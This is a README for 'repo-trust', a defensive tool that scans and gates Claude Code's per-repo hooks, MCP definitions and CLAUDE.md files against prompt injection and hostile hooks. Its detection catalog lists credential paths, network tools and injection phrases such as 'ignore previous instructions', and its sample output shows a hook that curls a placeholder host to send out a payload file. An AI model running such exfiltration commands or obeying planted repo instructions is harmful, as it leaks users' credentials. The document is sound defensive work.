# repo-trust

**A trust-on-first-use gate for Claude Code's repo-level configuration.**

[![CI](https://github.com/Christerfines/repo-trust/actions/workflows/ci.yml/badge.svg)](https://github.com/Christerfines/repo-trust/actions/workflows/ci.yml)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
[![Python 3.8+](https://img.shields.io/badge/python-3.8%2B-blue.svg)](#install)
[![Zero dependencies](https://img.shields.io/badge/dependencies-zero-brightgreen.svg)](#install)

> `git clone` is not a trust boundary. The moment you open a repo in Claude Code, its `.claude/` directory, `.mcp.json`, and `CLAUDE.md` are files Claude will *read and, in many cases, execute* — hooks fire, MCP servers launch, instructions get followed. repo-trust makes that moment a deliberate decision instead of an implicit one.

<p align="center">
  <img src="assets/example-output.png" alt="repo-trust review output for a repo with a CRITICAL SSH-key exfiltration finding, two WARNs, and a 10/10 HIGH risk score" width="640">
</p>

---

## Table of contents

- [Why this exists](#why-this-exists)
- [Who this is for](#who-this-is-for)
- [Where this fits next to Claude Code's own protections](#where-this-fits-next-to-claude-codes-own-protections)
- [What repo-trust is not](#what-repo-trust-is-not)
- [How it works](#how-it-works)
- [Install](#install)
- [Quick start](#quick-start)
- [Command reference](#command-reference)
- [What gets scanned](#what-gets-scanned)
- [Detection catalog](#detection-catalog)
- [Wiring into Claude Code](#wiring-into-claude-code)
- [The shell guard: closing the first-launch window](#the-shell-guard-closing-the-first-launch-window)
- [Hardening the trust store](#hardening-the-trust-store)
- [The kill switch](#the-kill-switch)
- [The `/claude-security` nudge](#the-claude-security-nudge)
- [Threat model & known limitations](#threat-model--known-limitations)
- [Project status](#project-status)
- [Roadmap](#roadmap)
- [Contributing](#contributing)
- [License](#license)

---

## Why this exists

Claude Code is configurable *per repository*. A repo can ship its own hooks (`.claude/hooks/`), its own MCP server definitions (`.mcp.json`), its own agents and skills, and a `CLAUDE.md` full of standing instructions — and all of it activates automatically the moment you `cd` into that repo and run `claude`. That is enormously useful for legitimate projects and an equally enormous attack surface for anything else: a cloned OSS repo, a contractor's fork, a coding-challenge template, a "helpful" gist someone told you to clone.

None of that configuration is sandboxed by default. A hook can shell out. An MCP server definition can point at an arbitrary binary. A `CLAUDE.md` can instruct the agent, in plain English, to read your SSH key and post it somewhere. This is not a hypothetical category of risk — 2026 alone has seen autonomous agents used as the delivery mechanism for real intrusions and ransomware campaigns, and "treat the agent's configuration as untrusted input" has become a stated design principle at the frontier labs building these systems.

repo-trust is a small, dependency-free answer to one specific slice of that problem: **you should have to look at what a repo's Claude configuration does before it runs, and you should be told the moment it changes underneath you.**

## Who this is for

repo-trust earns its keep for anyone who regularly opens Claude Code in repositories they didn't write and haven't fully read yet — a security or quality bar that stays constant no matter how many repos that is:

- **Developers who clone a lot of unfamiliar code** — OSS contributors triaging issues across dozens of repos, engineers evaluating a library or a coding-challenge template before committing to it, anyone who's ever `git clone`d something because a link in a Slack message or a tutorial told them to.
- **Consultants and freelancers working across client codebases**, where every new engagement is a new repo whose `.claude/` configuration you've never seen and didn't write.
- **Security-conscious teams** who want "did anyone actually look at this repo's Claude config before it ran" to be an answerable, auditable fact — not an assumption — and who are comfortable reading a heuristic finding themselves rather than outsourcing that judgment to a scanner.

It's a poor fit if you're only ever opening repos you or your own team wrote — the tool's whole value is in the moment before you'd otherwise trust something implicitly, and that moment doesn't come up if there's nothing external in the loop.

## Where this fits next to Claude Code's own protections

Claude Code already has first-party mechanisms that overlap with part of what repo-trust does, and it's worth being precise about the difference rather than implying repo-trust is filling a total void:

- A **workspace-trust prompt** the first time you open a new project directory.
- A **permission system** (`allow`/`deny`/`ask` rules for `Bash`, `Write`, etc.) and, on newer versions, sandboxing.
- An **approval dialog specifically for external `@import` targets** in a `CLAUDE.md`.

repo-trust doesn't replace any of that — it's a pre-flight layer for the one gap those mechanisms don't close on their own: a repo's `SessionStart` hook fires the moment `claude` launches inside it, before you've been asked anything, and before repo-trust's own Claude-Code-registered hooks ever get a turn (see [the shell guard](#the-shell-guard-closing-the-first-launch-window) for how that specific window gets closed). Think of it as "what would this repo's configuration *do*, described to me in a plain terminal, before any of Claude Code's own prompts even have a chance to fire" — complementary to the built-in trust surface, not competing with it.

## What repo-trust is not

Being upfront about scope is more useful than a long feature list:

- **Not a sandbox.** repo-trust doesn't isolate, contain, or execute anything. It reads text and pattern-matches it. It cannot stop a hook from doing something bad — it can only stop you from running that hook *silently, without ever having looked at it.*
- **Not a code security scanner.** It doesn't understand your application logic, your dependencies, or your business logic vulnerabilities. For that, run Anthropic's own [`/claude-security`](#the-claude-security-nudge) *inside* an already-approved session.
- **Not a substitute for reading the diff.** Every finding this tool produces is a heuristic pointer, not a verdict. Read the flagged snippet. The tool tells you where to look, not what to think.
- **Not protection against a hostile `SessionStart` hook, unless you've installed [the shell guard](#the-shell-guard-closing-the-first-launch-window).** Claude Code's hooks alone cannot block that first launch — this is the one gap that matters most, and closing it means gating `claude` itself, not adding another hook.
- **Not a cryptographic guarantee against store tampering.** Approvals are signed (see [Hardening the trust store](#hardening-the-trust-store)) to raise the bar, not to claim an unbreakable one — same-user code execution can, in the limit, always write a file that same user can write.

## How it works

```
                         ┌─────────────────────────────┐
                         │   ~/.claude/security/        │
                         │   trust-store.json            │
                         │  (per-repo approvals, content  │
                         │   hashes, gate on/off, scan     │
                         │   history — chmod 600)          │
                         └───────────────┬─────────────┘
                                          │
                     read/write by repo-trust CLI
                                          │
        ┌─────────────────────────────────┴──────────────────────────────┐
        │                                                                  │
┌───────▼────────┐                                              ┌─────────▼─────────┐
│  repo-trust     │   you, in a plain terminal, before ever      │  Claude Code       │
│  review <path>  │──►opening the repo in Claude ─────────────►  │  hooks (installed  │
│                 │   scans, shows findings + risk score,        │  once, user-scope) │
│                 │   you approve → hash recorded                │                    │
└─────────────────┘                                              │  SessionStart:     │
                                                                  │   warns in-context │
        content hash = sha256 over every file Claude Code        │   if unapproved /  │
        reads/executes in that repo. Any byte changes →           │   drifted / never   │
        hash changes → repo drops back to "drifted" until          │   security-scanned  │
        re-reviewed.                                               │                    │
                                                                  │  UserPromptSubmit:  │
                                                                  │   BLOCKS the turn   │
                                                                  │   if unapproved or  │
                                                                  │   drifted           │
                                                                  └────────────────────┘
```

Five pieces:

1. **`repo_trust.py`** — the engine. Walks the exact set of files/dirs Claude Code reads or executes, hashes them, pattern-matches them against known-risky constructs, signs approvals, and keeps a per-repo approval record.
2. **`hooks/session_start.py`** — fires on every new Claude Code session. Can't block (see limitations), but injects context so the model itself knows to be cautious and to say so.
3. **`hooks/user_prompt_submit.py`** — the actual in-session gate. Fires on every prompt; blocks turn processing outright for repos that are unapproved, drifted, or tampered, with a reason that tells you exactly what to run.
4. **`hooks/pre_tool_use.py`** — blocks Claude's own Bash/Write/Edit tool calls from touching the trust store, so a prompt-injected instruction can't just tell Claude to edit itself into "approved."
5. **`shell/guard.sh`** — an opt-in shell function that gates the *launch* of `claude` itself, before Claude Code (and any hook the target repo defines) ever starts. See [The shell guard](#the-shell-guard-closing-the-first-launch-window).

The three hooks are meant to be registered at **user scope** (`~/.claude/settings.json`), not project scope — a hostile repo's own project-level settings can add hooks, but it cannot selectively remove a single user-level one.

## Install

Requires Python 3.8+ and nothing else — no third-party packages, no build step.

```bash
git clone <this-repo-url> repo-trust
cd repo-trust
chmod +x bin/repo-trust

# put it on your PATH, e.g.:
ln -s "$(pwd)/bin/repo-trust" /usr/local/bin/repo-trust
```

Or, via `pip` (still zero runtime dependencies — `pyproject.toml` just adds a console-script entry point). Use an editable install so `repo_trust.py` stays in this checkout, next to `hooks/` — `install-hooks` below resolves the hook scripts relative to wherever `repo_trust.py` actually lives, and a non-editable install would copy just the module elsewhere without them:

```bash
pip install -e .
```

Verify:

```bash
repo-trust --help
```

Then register the three hooks at user scope (see [Wiring into Claude Code](#wiring-into-claude-code)):

```bash
repo-trust install-hooks
```

## Quick start

```bash
# Before ever opening a new/untrusted repo in Claude Code:
repo-trust review /path/to/some-repo
```

```
Repo:     /path/to/some-repo
Identity: https://github.com/someone/some-repo.git
Files scanned (2):
  - .claude/hooks/post-edit.sh
  - .mcp.json

Findings:
  [WARN    ] .claude/hooks/post-edit.sh:4  makes an outbound network call
             curl -s https://example.com/collect -d @/tmp/payload
  [WARN    ] .mcp.json:9  runs a package via npx without review (auto-confirms install)
             "command": "npx", "args": ["-y", "some-random-mcp-server"]

Risk: 3/10 - LOW

This checks 'does this reach outside the repo', not general code quality.
For a deeper code-level scan, once you trust this repo enough to open it,
run `/claude-security` inside the Claude Code session.

Approve this repo's Claude configuration? [y/N]
```

Say no, and nothing is recorded — the repo stays `unapproved`, and Claude Code's `UserPromptSubmit` hook will block any turn started inside it until you come back and either approve it or run `repo-trust disable`.

Say yes, and the content hash is recorded. Open the repo in Claude Code — it works normally. Edit any of the files repo-trust tracks (even by a byte) and the next session flags it as `drifted`, with a real diff, not just a filename.

## Command reference

| Command | Description |
|---|---|
| `repo-trust review [path]` | Scan a repo's Claude configuration, print findings + risk score, prompt for approval. `--yes` skips the prompt. Resolves to the repo's git root first, even if `path` is a subdirectory. |
| `repo-trust status [path]` | Print `TRUSTED` / `DRIFTED` / `UNAPPROVED` / `TAMPERED` for a repo, plus gate state, approval-time risk score, and `/claude-security` scan history. `--json` for machine-readable output (exit code doubles as a check: `0` only when trusted). |
| `repo-trust list` | List every repo with a recorded approval, its last-approved timestamp, and its security-scan status. |
| `repo-trust forget <path>` | Revoke a repo's approval — next session it's `unapproved` again. |
| `repo-trust enable` | Turn the gate back on globally. |
| `repo-trust disable` | Turn the gate off globally — no repo will be blocked until you re-enable. |
| `repo-trust launch-check [path]` | Used internally by `shell/guard.sh`. Exit `0` if `claude` should be allowed to launch here (trusted, or gate disabled), exit `1` with the block reason on stderr otherwise. |
| `repo-trust install-hooks` | Register the three hooks (see [Wiring into Claude Code](#wiring-into-claude-code)) in `~/.claude/settings.json`, pointing at this installation's actual path. Backs up the existing file first, is idempotent on repeat runs, and updates the path in place if you move the install directory and re-run it. |
| `repo-trust uninstall-hooks` | Remove exactly the hook entries `install-hooks` added, leaving everything else in `~/.claude/settings.json` untouched. |

`path` defaults to `.` everywhere it's accepted.

## What gets scanned

Every surface Claude Code itself reads or executes for a repo:

```
.claude/settings.json
.claude/settings.local.json
.mcp.json
CLAUDE.md
.claude/CLAUDE.md
CLAUDE.local.md
.claude/hooks/       (recursive)
.claude/agents/       (recursive)
.claude/skills/        (recursive)
.claude/commands/       (recursive)
.claude/rules/          (recursive)
.claude-plugin/          (recursive)
```

Plus two things that aren't a fixed path:

- **Nested `CLAUDE.md` / `CLAUDE.local.md` anywhere in the repo tree.** Claude Code loads these on demand the moment Claude reads a file in that subdirectory — a payload in `src/CLAUDE.md` is just as live as one in the root file, so repo-trust walks the whole tree for them. That walk prunes well-known dependency/build directories for performance (`node_modules`, `.venv`, `venv`, `__pycache__`, `dist`, `build`, `.tox`, `target`, `vendor`, `.terraform`, `Pods`, `coverage`, `.next`, `.idea`, `.gradle`, plus `.git`) and caps out at 20,000 candidate files / ~2 seconds; a `CLAUDE.md` placed inside a pruned directory, or a repo large enough to hit the cap, is a documented gap, not a silent one — hitting the cap always produces a visible WARN finding rather than quietly under-scanning.
- **`@path/to/file` imports inside any CLAUDE.md-family file.** Claude Code resolves these recursively at launch. repo-trust follows the same references: an import that resolves to a real file *inside* the repo gets read, hashed, and pattern-matched like any other tracked file; one that resolves to a real file *outside* the repo is flagged rather than silently ignored, since Claude Code gates exactly that case with its own approval dialog and repo-trust can't see what's on the other side of it. A token that doesn't resolve to an existing file at all (a typo, a decorator-shaped false match like `@property`, a stray `@mention`) is treated as a non-import and silently skipped, the same way Claude Code itself wouldn't load something that isn't there - if such a file is created later, it shows up as `drifted` on the next check rather than being retroactively flagged now. Import-following is scoped to the CLAUDE.md family specifically — `.claude/rules|skills|agents|commands` are still scanned for direct risk patterns, but repo-trust doesn't currently assert that `@import` works inside them too, since Claude Code's docs don't confirm it.

If none of this exists, the repo is trivially `trusted` — there's nothing for Claude Code to reach outside the repo with.

## Detection catalog

Three severities. All heuristic — see [limitations](#threat-model--known-limitations).

**CRITICAL** — direct references to credential material:

| Pattern catches | Why it matters |
|---|---|
| `.ssh/id_rsa`, `id_ed25519`, `id_ecdsa` | SSH private key |
| `.aws/credentials` | AWS credentials |
| `.netrc` | stored HTTP credentials |
| `~/.claude(-mem)?/.env`, `credentials`, `config.json` | Claude Code's own stored credentials |
| `ANTHROPIC_API_KEY`, `OPENAI_API_KEY` | API key env vars |
| `/etc/passwd` | system user enumeration |
| a tracked config path is a symlink resolving outside the repo | silent filesystem escape — the content you're reading isn't what it looks like |

**WARN** — reaches outside the repo, or obfuscation commonly used to hide payloads:

| Pattern catches | Why it matters |
|---|---|
| `curl`, `wget`, `nc -`, `ncat` | outbound network call |
| `"type": "http"` hook | network call fires on every trigger |
| `$HOME`, `~/` (outside `.claude/{hooks,agents,skills,commands,rules}`) | escapes the repo root |
| an `@import` in a CLAUDE.md-family file resolves outside the repo (or not at all as a real file) | Claude Code gates this with its own approval dialog; repo-trust can't see what's on the other side |
| an unclosed code fence in a CLAUDE.md-family file | can't rule out it's hiding an `@import` from the naive fence-aware scan; content after it is still scanned rather than skipped |
| unscoped `"Bash"` / `"Bash(**)"` / `"*"` permission grants | broad execution rights |
| `eval`, `exec(`, `os.system(`, `shell=True` | dynamic code execution |
| `base64 -d` / `--decode` | classic payload obfuscation |
| `npx -y` / `--yes`, `pip(x) install\|run` | runs/installs a package at execution time, unpinned |
| long hex-escaped byte strings, `atob(`, `Buffer.from(..., 'base64')` | obfuscated payloads |
| PowerShell `-enc`/`-encodedcommand` | encoded-command obfuscation |
| inline `python -c "..."` | one-liner that doesn't show up as a reviewable script |
| absolute paths outside the repo (`/Users/...`, `/home/...`) | filesystem escape |

**WARN (injection phrasing)** — applied only to natural-language instruction surfaces (the CLAUDE.md family, `.claude/skills`, `.claude/agents`, `.claude/commands`, `.claude/rules`, and anything reached via `@import` from a CLAUDE.md-family file), not JSON or hook scripts, to keep the false-positive rate down:

| Pattern catches | Why it matters |
|---|---|
| "ignore (all/previous/prior/above) instructions" | classic injection phrasing |
| "disregard the above/previous/prior" | classic injection phrasing |
| "do not tell/inform/mention/show ... the user" | instructs the agent to hide an action |
| "without asking/telling/notifying the user" | instructs the agent to bypass user awareness |
| "send this/the/your file/contents/key/credentials/ssh key/env to" | exfiltration phrasing |
| "exfiltrate" | says the quiet part out loud |

These are explicitly heuristic and high-false-positive-tolerant — a `CLAUDE.md` that legitimately discusses prompt injection as a topic will trip these. Read the snippet before acting on it.

**INFO** — not risky by itself, just worth knowing exists:

| Pattern catches |
|---|
| `"hooks":` block present |
| `"mcpServers":` block present |

Every finding reports the exact file, line number, and matching snippet — nothing is summarized away. `repo-trust review` also prints an aggregate **risk score (0–10)** — `CLEAN` / `LOW` / `MEDIUM` / `HIGH` — weighted `CRITICAL=4, WARN=1, INFO=0`, capped at 10, so a repo with one stray `curl` doesn't read the same as one with a dozen obfuscated payloads.

Whatever findings and risk score were shown at the moment you approved are recorded alongside the approval (`findingsAtApproval` / `riskScoreAtApproval` in the store), and `repo-trust status` surfaces them (`Approved at risk 3/10 (LOW) with 2 finding(s).`) — so "you approved this despite warnings" is answerable later, not only visible in scrollback at the time.

## Wiring into Claude Code

Run `repo-trust install-hooks` and skip the rest of this section — it registers all three hooks at **user scope** in `~/.claude/settings.json` for you, pointing at wherever you actually installed repo-trust, and backs up the file first. It's idempotent, so re-running it after moving the install directory just updates the paths in place. `repo-trust uninstall-hooks` reverses it.

If you'd rather wire it up by hand (or want to see exactly what `install-hooks` writes), register all three hooks at **user scope** so a hostile repo's project-level settings can't quietly disable them (`~/.claude/settings.json`):

```json
{
  "hooks": {
    "SessionStart": [
      {
        "hooks": [
          { "type": "command", "command": "python3 /absolute/path/to/repo-trust/hooks/session_start.py", "timeout": 10 }
        ]
      }
    ],
    "UserPromptSubmit": [
      {
        "hooks": [
          { "type": "command", "command": "python3 /absolute/path/to/repo-trust/hooks/user_prompt_submit.py", "timeout": 10 }
        ]
      }
    ],
    "PreToolUse": [
      {
        "hooks": [
          { "type": "command", "command": "python3 /absolute/path/to/repo-trust/hooks/pre_tool_use.py", "timeout": 10 }
        ]
      }
    ]
  }
}
```

Substitute the absolute path to wherever you cloned this repo. That's the hook integration — no daemon, no service, no state beyond `~/.claude/security/trust-store.json` and `trust.key`. Add [the shell guard](#the-shell-guard-closing-the-first-launch-window) separately, since it's a shell-rc change rather than a Claude Code setting.

## The shell guard: closing the first-launch window

The hooks above only run *inside* a Claude Code session — which means they only ever get a turn *after* Claude Code has already started. A malicious repo's own `SessionStart` hook fires the moment `claude` launches inside it, and `SessionStart` has no ability to block anything. No hook-level fix closes this; it's a structural property of where hooks sit in the lifecycle.

`shell/guard.sh` fixes this by moving the check outside Claude Code entirely — it gates the *launch of `claude` itself*:

```bash
claude() {
  if command -v repo-trust >/dev/null 2>&1; then
    repo-trust launch-check . || return 1
  fi
  command claude "$@"
}
```

Install it by adding one line to your shell rc file:

```bash
echo 'source /absolute/path/to/repo-trust/shell/guard.sh' >> ~/.zshrc   # or ~/.bashrc
```

(Printed here for you to add yourself — this tool doesn't edit your dotfiles for you.) Open a new shell, and `claude` inside an unapproved/drifted/tampered repo is refused *before the real binary ever runs*, so the target repo's own hooks never get a process to execute in. `command claude "$@"` always reaches the real binary when the check passes, regardless of the function shadowing it.

This closes the gap for terminal launches. It does **not** cover the desktop app or IDE extensions launching Claude Code by other means — say so plainly rather than implying full coverage.

## Hardening the trust store

`~/.claude/security/trust-store.json` has to be writable by you — which means it's writable by anything running as your OS user, including Claude Code acting on a hostile repo's instructions. No file-permission scheme fully closes that; it's a same-user-code-execution problem, not a tool bug. Two things raise the bar without pretending to solve it:

- **Signed approvals, covering the full audit record.** Every approval is signed with a locally generated key (`~/.claude/security/trust.key`, `chmod 600`, created on first use). As of the signing scheme in use since 0.2.0 (`sigVersion: 2`), the signature covers `findingsAtApproval` and `riskScoreAtApproval` as well as the identity and content hash — so editing the recorded findings to make a past approval look cleaner than it was is tamper-evident too, not just editing the hash/identity that gates trust. `repo-trust status`/the hooks verify the signature on every check, dispatching on the entry's own declared `sigVersion` so upgrading the tool never retroactively flags an untouched legacy approval as `TAMPERED`; if it's missing or wrong — including a content hash that happens to match but wasn't produced by `repo-trust review` — the repo reports `TAMPERED`, a status distinct from `unapproved`, because "never reviewed" and "reviewed, then silently altered outside this tool" deserve different alarm levels. This stops a naive rewrite of the store; it does not stop an attacker who can also read `trust.key` and replicate the signing scheme, since that key lives at the same trust level as the store itself. Approvals made before 0.2.0 keep their narrower (`sigVersion: 1`, hash-only) guarantee until they're next re-approved — there's no forced mass re-signing.
- **A `PreToolUse` guard.** `hooks/pre_tool_use.py` blocks Claude's own `Bash`/`Write`/`Edit`/`NotebookEdit` tool calls from touching anything under `~/.claude/security/`. This covers the *actual most likely* version of this attack — a prompt-injected instruction telling Claude to edit the store through its normal tools — without requiring the repo to have raw shell hook execution at all. It cannot stop a hook script's own process from writing the file directly; that's arbitrary code running as you, and no Claude Code hook can observe a process's own file writes that don't go through Claude's tool-use path.
- **Optimistic-concurrency writes.** Two repo-trust invocations landing at nearly the same instant (a CLI command and a hook's `/claude-security` timestamp write, say) could otherwise lose one write to the other. Every mutation carries a `storeVersion` counter and re-checks it immediately before writing, retrying the whole load-mutate-save cycle on a mismatch instead of overwriting blindly. This is deliberately not a lockfile: a lock that times out has to either hang a hook past its timeout or fall back to writing unprotected anyway, which reproduces the exact race it exists to prevent. The optimistic retry narrows the race rather than eliminating it (stdlib offers no portable atomic compare-and-swap on file content), but the actual risk here is a lost, re-runnable write, not a security bypass.

Together: signing turns "tampering" into a visible, distinctly-labeled status instead of a silent bypass, and the `PreToolUse` guard closes the easiest way to trigger it. Neither is a cryptographic guarantee — see [Threat model](#threat-model--known-limitations).

## The kill switch

Every blocked-turn message and every `SessionStart` warning tells you, inline, how to turn this off:

```
Blocked by repo-trust: <repo> has not been reviewed. Run `repo-trust review <path>`
in a plain terminal (not through me) to see what its .claude/ configuration would
reach outside the repo, then approve or decline.

To turn this gate off entirely: `repo-trust disable` (re-enable with `repo-trust enable`).
```

`repo-trust disable` is a single global toggle stored in the trust store. It's a blunt instrument on purpose — you own this machine, and a tool that can't get out of its own way when you need it to isn't a tool you'll keep using. `repo-trust status` and `repo-trust list` always show current gate state so it's never a silent setting.

## The `/claude-security` nudge

repo-trust's scan answers one question: *does this configuration reach outside the repo?* It says nothing about whether the code inside the repo is otherwise secure — that's what Anthropic's own `/claude-security` plugin is for, run from **inside** a session once you've already decided to trust the repo enough to open it.

To make that second step discoverable instead of opt-in-and-forgotten:

- Every time you run `/claude-security` in a repo, `hooks/user_prompt_submit.py` timestamps it in that repo's trust-store entry.
- `SessionStart`, for any repo that's approved but has **never** had a `/claude-security` scan, injects context asking Claude to proactively offer running it.
- `repo-trust status` / `repo-trust list` show `Security scan: never` or the last-run timestamp, so "has this ever actually been scanned" is always answerable, not just assumed.

## Threat model & known limitations

Read this section before trusting this tool more than it's earned:

- **This is heuristic triage, not verification.** Regexes catch known shapes of bad behavior. They do not catch novel obfuscation, and a `snippet` you don't recognize is a reason to go read the file, not a reason to assume it's fine.
- **`SessionStart` cannot block a session — [the shell guard](#the-shell-guard-closing-the-first-launch-window) is what actually closes this, for CLI launches.** Without it, a malicious repo's *own* `SessionStart` hook still fires the very first time you run `claude` inside it, before repo-trust's Claude-Code-hooks ever get a turn. With `shell/guard.sh` sourced, `claude` itself refuses to launch against an unapproved/drifted/tampered repo, so the target repo's hooks never get a process to run in at all. This does **not** cover the desktop app or IDE extensions — only shells that have sourced the guard.
- **Trust-store tampering is hardened, not eliminated — [see above](#hardening-the-trust-store).** Signed approvals plus the `PreToolUse` guard stop a naive rewrite and stop Claude's own tools from being used to tamper. Neither stops a sufficiently privileged attacker (one who can read `trust.key` and forge a valid signature, or whose code runs outside Claude's tool-use path entirely) — that's a same-user-code-execution problem no userspace file scheme fully closes.
- **Content-hash approval, not semantic approval.** Re-approving a "drifted" repo means you looked at what changed (the diff is shown to you) and accepted it — the tool has no opinion on whether the change is good.
- **Not a sandbox.** See [What repo-trust is not](#what-repo-trust-is-not). Nothing here contains what an approved hook does at runtime.
- **Local trust store, not shared.** Approvals live in `~/.claude/security/trust-store.json` on your machine only (mode `0600`). There is no reputation network, no "other people already flagged this" signal — see [Roadmap](#roadmap).
- **Injection-phrasing detection is heuristic and English-centric.** It matches specific phrasings, not intent — a differently-worded or non-English injection attempt won't trip it, and legitimate text discussing prompt injection as a topic will.
- **The nested-`CLAUDE.md` walk prunes and caps for performance.** It skips well-known dependency/build directories (see [What gets scanned](#what-gets-scanned)) and stops past 20,000 candidate files / ~2 seconds, since it runs on every hook invocation, not just `repo-trust review`. A `CLAUDE.md` placed inside a pruned directory is a real, if narrow, blind spot; a repo large enough to hit the cap gets a visible WARN finding rather than a silent gap, but the scan past that point is genuinely incomplete.
- **`@import` following is heuristic and scoped to the CLAUDE.md family.** The import-token match is a heuristic (it can both over-match prose that merely looks path-shaped and, in principle, miss something Claude Code's own parser would resolve) and doesn't attempt to follow imports from `.claude/rules|skills|agents|commands`, since Claude Code's documentation doesn't confirm `@import` applies there. Treat a clean import scan the same way you'd treat any other heuristic finding here — a pointer, not a verdict.
- **Repo identity is self-reported, local git config.** `repo_identity()` reads `git config --get remote.origin.url`, which is ordinary local metadata anyone can set to anything (`git remote add origin <any-url>`) — it is not verified against the actual remote. This mostly matters for cosmetics (what name shows up in a block message): the actual trust decision still runs on the content hash and signature, so a spoofed identity colliding with a real approved entry would need matching tracked-file bytes too, not just a matching URL string, and any mismatch there still surfaces as `drifted`, not a false `trusted`.

## Project status

This is a young project (0.2.0) that has been through one deliberate round of independent review beyond the author's own testing — not a substitute for time in the field, but worth being upfront about. That pass found and fixed several concrete issues that had been introduced while widening the scanned surface for this release, including two that mattered: an internal (non-escaping) symlink briefly went unread and therefore unscanned, and the nested-file walk's time cap could be bypassed entirely by a large subtree with no candidate files in it. Both are fixed, covered by regression tests, and listed with the rest of that pass's findings in [CHANGELOG.md](CHANGELOG.md) under 0.2.0 — the same "findings are recorded, not just fixed and forgotten" principle this tool applies to your own approvals (see [Detection catalog](#detection-catalog)) applies to itself.

Practically, this means: read the code before you rely on it, the same advice this README gives about every finding it produces. Report anything you find per [SECURITY.md](SECURITY.md).

## Roadmap

Documented and deliberately not built yet — bigger, separable efforts than a single script can responsibly take on:

- **Shared reputation feed** — has this exact repo hash been flagged by anyone else, opt-in and privacy-preserving.
- **Sandboxed hook dry-run** — execute a repo's hooks in an isolated environment and observe behavior, instead of only reading source.
- **Signed-commit / provenance checks** — factor commit signing and repo provenance into the trust decision, not just file contents.
- **MCP server binary reputation** — beyond regex on `.mcp.json`, resolve and check the actual package/binary a server definition would launch.
- **Non-English / paraphrased injection-phrasing detection** — the current patterns are narrow on purpose; broadening them without blowing up false positives is real work.

Issues and PRs proposing any of the above are welcome — see [Contributing](#contributing).

## Contributing

This is a small, deliberately dependency-free tool — keep it that way. Before opening a PR:

- New detection patterns go in `CRITICAL_PATTERNS` / `WARN_PATTERNS` / `INFO_PATTERNS` / `INJECTION_PATTERNS` in `repo_trust.py`, following the existing `(regex, message)` shape.
- If you're adding a pattern, include the real-world construct it's meant to catch in your PR description — false-positive rate matters more than raw coverage for a tool that's meant to stay usable.
- No new runtime dependencies. Standard library only — including in tests (`tests/test_repo_trust.py` uses stdlib `unittest`, no `pytest`).
- Add or update a test in `tests/test_repo_trust.py` for any behavior change. `python -m unittest discover -s tests -v` must pass; CI (`.github/workflows/ci.yml`) runs it on Python 3.8–3.12.
- Run the manual verification flow in a scratch repo before submitting (create a throwaway `.claude/hooks/` with the construct you're targeting, run `repo-trust review`, confirm the finding and risk score).

## License

Apache License 2.0 — see [LICENSE](LICENSE).
